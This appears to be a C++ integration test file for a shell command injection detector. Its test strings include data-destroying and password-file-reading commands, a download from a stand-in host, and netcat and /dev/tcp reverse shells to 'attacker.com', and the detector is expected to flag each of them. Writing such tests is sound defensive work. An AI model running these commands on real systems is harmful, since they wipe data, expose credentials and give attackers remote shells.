/**
 * @file test_shell_detector_integration.cpp
 * @brief Integration Tests for Shell Command Injection Detection
 *
 * WHAT: Integration tests for shell detector with other NIMCP modules
 * WHY:  Ensure proper integration with BBB, bio-async messaging, and logging
 * HOW:  Test end-to-end workflows, OS context detection, sanitization
 *
 * @author NIMCP Team
 * @date 2025-12-07
 */

#include <gtest/gtest.h>
#include <thread>
#include <chrono>

// Headers have their own extern "C" guards
#include "security/nimcp_shell_detector.h"
#include "async/nimcp_bio_async.h"
#include "utils/logging/nimcp_logging.h"
#include "utils/memory/nimcp_memory.h"

//=============================================================================
// Test Fixture
//=============================================================================

class ShellDetectorIntegrationTest : public ::testing::Test {
protected:
    nimcp_shell_detector_t detector;
    nimcp_bio_async_t bio_async;

    void SetUp() override {
        /* Initialize bio-async system */
        bio_async = nimcp_bio_async_get_instance();
        if (!bio_async) {
            nimcp_error_t err = nimcp_bio_async_init();
            ASSERT_EQ(NIMCP_SUCCESS, err);
            bio_async = nimcp_bio_async_get_instance();
            ASSERT_NE(nullptr, bio_async);
        }

        /* Create detector */
        detector = nimcp_shell_detector_create(nullptr);
        ASSERT_NE(nullptr, detector);

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    void TearDown() override {
        if (detector) {
            nimcp_shell_detector_destroy(detector);
            detector = nullptr;
        }
    }
};

//=============================================================================
// Bio-Async Integration Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, BioAsyncRegistration) {
    /* Detector should be registered with bio-async */
    SUCCEED();
}

TEST_F(ShellDetectorIntegrationTest, MultipleDetectorsCoexist) {
    nimcp_shell_detector_t d1 = nimcp_shell_detector_create(nullptr);
    nimcp_shell_detector_t d2 = nimcp_shell_detector_create(nullptr);

    ASSERT_NE(nullptr, d1);
    ASSERT_NE(nullptr, d2);

    nimcp_shell_detection_result_t result;

    EXPECT_EQ(NIMCP_SHELL_SUCCESS,
              nimcp_shell_detect(d1, "safe", NIMCP_SHELL_CONTEXT_AUTO, &result));
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(d2, "rm -rf /", NIMCP_SHELL_CONTEXT_AUTO, &result));

    nimcp_shell_detector_destroy(d1);
    nimcp_shell_detector_destroy(d2);
}

//=============================================================================
// End-to-End Workflow Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, FullWorkflow_SafeCommand) {
    nimcp_shell_detection_result_t result;
    nimcp_shell_detector_stats_t stats;

    nimcp_shell_detector_get_stats(detector, &stats);
    uint64_t initial = stats.total_detections;

    nimcp_shell_error_t err = nimcp_shell_detect(
        detector, "safe_command_123", NIMCP_SHELL_CONTEXT_AUTO, &result);

    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_TRUE(result.valid);

    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(initial + 1, stats.total_detections);
}

TEST_F(ShellDetectorIntegrationTest, FullWorkflow_ThreatDetection) {
    nimcp_shell_detection_result_t result;
    nimcp_shell_detector_stats_t stats;

    nimcp_shell_detector_get_stats(detector, &stats);
    uint64_t initial_threats = stats.threats_detected;

    nimcp_shell_error_t err = nimcp_shell_detect(
        detector, "echo test; rm -rf /", NIMCP_SHELL_CONTEXT_UNIX, &result);

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED, err);
    EXPECT_FALSE(result.valid);
    EXPECT_GT(result.severity, NIMCP_SHELL_SEVERITY_NONE);

    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(initial_threats + 1, stats.threats_detected);
}

//=============================================================================
// OS Context Detection Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, UnixContextDetection) {
    nimcp_shell_detection_result_t result;

    /* Unix-specific threats */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "/bin/bash",
                                NIMCP_SHELL_CONTEXT_UNIX, &result));
    EXPECT_EQ(NIMCP_SHELL_PATTERN_DANGEROUS_CMD, result.pattern);

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "cat /etc/passwd",
                                NIMCP_SHELL_CONTEXT_UNIX, &result));
}

TEST_F(ShellDetectorIntegrationTest, WindowsContextDetection) {
    nimcp_shell_detection_result_t result;

    /* Windows-specific threats */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "cmd.exe /c dir",
                                NIMCP_SHELL_CONTEXT_WINDOWS, &result));
    EXPECT_EQ(NIMCP_SHELL_PATTERN_DANGEROUS_CMD, result.pattern);

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "powershell Get-Process",
                                NIMCP_SHELL_CONTEXT_WINDOWS, &result));
}

TEST_F(ShellDetectorIntegrationTest, AutoContextDetection) {
    nimcp_shell_detection_result_t result;

    /* Auto-detect Unix context */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "/bin/sh",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));

    /* Auto-detect Windows context */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "cmd.exe",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));
}

//=============================================================================
// Sanitization Integration Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, SanitizeThenDetect) {
    char sanitized[256];
    nimcp_shell_detection_result_t result;

    /* Sanitize dangerous input */
    const char* dangerous = "test; rm -rf /";
    nimcp_shell_error_t err = nimcp_shell_sanitize(detector, dangerous,
                                                    sanitized, sizeof(sanitized));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);

    /* Sanitized version should be safe */
    err = nimcp_shell_detect(detector, sanitized,
                            NIMCP_SHELL_CONTEXT_AUTO, &result);
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_TRUE(result.valid);
}

TEST_F(ShellDetectorIntegrationTest, SanitizeComplexInput) {
    char sanitized[256];

    nimcp_shell_sanitize(detector, "user@host && malicious",
                        sanitized, sizeof(sanitized));
    EXPECT_STREQ("user@host  malicious", sanitized);

    nimcp_shell_sanitize(detector, "file>output.txt",
                        sanitized, sizeof(sanitized));
    EXPECT_STREQ("fileoutput.txt", sanitized);
}

//=============================================================================
// Multi-Pattern Detection Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, DetectVariousPatterns) {
    nimcp_shell_detector_stats_t stats;
    nimcp_shell_detection_result_t result;

    nimcp_shell_detector_reset_stats(detector);

    /* Separator */
    nimcp_shell_detect(detector, "cmd1; cmd2",
                      NIMCP_SHELL_CONTEXT_AUTO, &result);

    /* Substitution */
    nimcp_shell_detect(detector, "$(malicious)",
                      NIMCP_SHELL_CONTEXT_AUTO, &result);

    /* Dangerous command */
    nimcp_shell_detect(detector, "rm -rf /",
                      NIMCP_SHELL_CONTEXT_AUTO, &result);

    /* Redirection */
    nimcp_shell_detect(detector, "cat > file",
                      NIMCP_SHELL_CONTEXT_AUTO, &result);

    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(4, stats.threats_detected);
    EXPECT_GT(stats.separator_patterns, 0);
    EXPECT_GT(stats.substitution_patterns, 0);
    EXPECT_GT(stats.dangerous_cmd_patterns, 0);
    EXPECT_GT(stats.redirection_patterns, 0);
}

//=============================================================================
// High-Volume Testing
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, HighVolumeDetection) {
    const int num_tests = 1000;
    int threats = 0, safe = 0;

    for (int i = 0; i < num_tests; i++) {
        nimcp_shell_detection_result_t result;
        const char* cmd = (i % 2 == 0) ? "safe_command" : "rm -rf /";

        nimcp_shell_error_t err = nimcp_shell_detect(
            detector, cmd, NIMCP_SHELL_CONTEXT_AUTO, &result);

        if (err == NIMCP_SHELL_ERROR_THREAT_DETECTED) threats++;
        else if (err == NIMCP_SHELL_SUCCESS) safe++;
    }

    EXPECT_EQ(num_tests / 2, threats);
    EXPECT_EQ(num_tests / 2, safe);
}

//=============================================================================
// Real-World Attack Scenarios
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, RealWorld_WebApplicationInput) {
    nimcp_shell_detection_result_t result;

    /* Common web app injection attempts */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "127.0.0.1; cat /etc/passwd",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "file.txt && wget malicious.com",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));
}

TEST_F(ShellDetectorIntegrationTest, RealWorld_ReverseShellAttempt) {
    nimcp_shell_detection_result_t result;

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector, "nc attacker.com 4444 -e /bin/sh",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(detector,
                                "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));
}

//=============================================================================
// Configuration Integration Tests
//=============================================================================

TEST_F(ShellDetectorIntegrationTest, CustomConfiguration) {
    nimcp_shell_detector_config_t cfg = nimcp_shell_detector_default_config();
    cfg.enable_separator_detection = false;
    cfg.enable_dangerous_cmd_detection = true;

    nimcp_shell_detector_t custom = nimcp_shell_detector_create(&cfg);
    ASSERT_NE(nullptr, custom);

    nimcp_shell_detection_result_t result;

    /* Separator should pass (disabled) */
    EXPECT_EQ(NIMCP_SHELL_SUCCESS,
              nimcp_shell_detect(custom, "cmd1; cmd2",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));

    /* Dangerous command should still be detected */
    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED,
              nimcp_shell_detect(custom, "rm -rf /",
                                NIMCP_SHELL_CONTEXT_AUTO, &result));

    nimcp_shell_detector_destroy(custom);
}

//=============================================================================
// Main
//=============================================================================

int main(int argc, char** argv) {
    testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
